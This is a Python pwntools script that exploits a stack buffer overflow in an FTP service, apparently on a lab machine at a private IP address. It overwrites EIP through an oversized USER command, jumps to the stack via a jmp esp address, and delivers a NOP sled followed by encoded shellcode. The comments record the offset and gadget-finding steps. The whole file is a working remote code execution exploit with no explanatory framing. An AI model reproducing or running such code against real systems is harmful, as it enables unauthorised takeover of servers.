from pwn import * 

ip = "192.168.15.172"
port = 21

cmd = "USER " #not necessary
offset_to_eip = 2002 + len(cmd)#pwn cyclic -l 0x61627561
offset_to_esp = 2015 #pwn cyclic -l ueaa, eip as 0xcafebabe to test
new_eip =  0x74B1B843 #!mona jmp -m * -r esp

shellcode =  b"\x90"*16
shellcode += b"\xda\xc3\xd9\x74\x24\xf4\x5d\x33\xc9\xb1\x52"
shellcode += b"\xba\xbb\xa8\xa7\xa0\x31\x55\x17\x03\x55\x17"
shellcode += b"\x83\x7e\xac\x45\x55\x7c\x45\x0b\x96\x7c\x96"
shellcode += b"\x6c\x1e\x99\xa7\xac\x44\xea\x98\x1c\x0e\xbe"
shellcode += b"\x14\xd6\x42\x2a\xae\x9a\x4a\x5d\x07\x10\xad"
shellcode += b"\x50\x98\x09\x8d\xf3\x1a\x50\xc2\xd3\x23\x9b"
shellcode += b"\x17\x12\x63\xc6\xda\x46\x3c\x8c\x49\x76\x49"
shellcode += b"\xd8\x51\xfd\x01\xcc\xd1\xe2\xd2\xef\xf0\xb5"
shellcode += b"\x69\xb6\xd2\x34\xbd\xc2\x5a\x2e\xa2\xef\x15"
shellcode += b"\xc5\x10\x9b\xa7\x0f\x69\x64\x0b\x6e\x45\x97"
shellcode += b"\x55\xb7\x62\x48\x20\xc1\x90\xf5\x33\x16\xea"
shellcode += b"\x21\xb1\x8c\x4c\xa1\x61\x68\x6c\x66\xf7\xfb"
shellcode += b"\x62\xc3\x73\xa3\x66\xd2\x50\xd8\x93\x5f\x57"
shellcode += b"\x0e\x12\x1b\x7c\x8a\x7e\xff\x1d\x8b\xda\xae"
shellcode += b"\x22\xcb\x84\x0f\x87\x80\x29\x5b\xba\xcb\x25"
shellcode += b"\xa8\xf7\xf3\xb5\xa6\x80\x80\x87\x69\x3b\x0e"
shellcode += b"\xa4\xe2\xe5\xc9\xcb\xd8\x52\x45\x32\xe3\xa2"
shellcode += b"\x4c\xf1\xb7\xf2\xe6\xd0\xb7\x98\xf6\xdd\x6d"
shellcode += b"\x0e\xa6\x71\xde\xef\x16\x32\x8e\x87\x7c\xbd"
shellcode += b"\xf1\xb8\x7f\x17\x9a\x53\x7a\xf0\x65\x0b\x8b"
shellcode += b"\x55\x0e\x4e\x93\x44\x92\xc7\x75\x0c\x3a\x8e"
shellcode += b"\x2e\xb9\xa3\x8b\xa4\x58\x2b\x06\xc1\x5b\xa7"
shellcode += b"\xa5\x36\x15\x40\xc3\x24\xc2\xa0\x9e\x16\x45"
shellcode += b"\xbe\x34\x3e\x09\x2d\xd3\xbe\x44\x4e\x4c\xe9"
shellcode += b"\x01\xa0\x85\x7f\xbc\x9b\x3f\x9d\x3d\x7d\x07"
shellcode += b"\x25\x9a\xbe\x86\xa4\x6f\xfa\xac\xb6\xa9\x03"
shellcode += b"\xe9\xe2\x65\x52\xa7\x5c\xc0\x0c\x09\x36\x9a"
shellcode += b"\xe3\xc3\xde\x5b\xc8\xd3\x98\x63\x05\xa2\x44"
shellcode += b"\xd5\xf0\xf3\x7b\xda\x94\xf3\x04\x06\x05\xfb"
shellcode += b"\xdf\x82\x25\x1e\xf5\xfe\xcd\x87\x9c\x42\x90"
shellcode += b"\x37\x4b\x80\xad\xbb\x79\x79\x4a\xa3\x08\x7c"
shellcode += b"\x16\x63\xe1\x0c\x07\x06\x05\xa2\x28\x03"



payload = fit({
	0:cmd,
	offset_to_eip:new_eip,
	offset_to_esp:shellcode,
	}, length=3000)

conn = remote(ip,port)
conn.readline()
conn.sendline(payload)
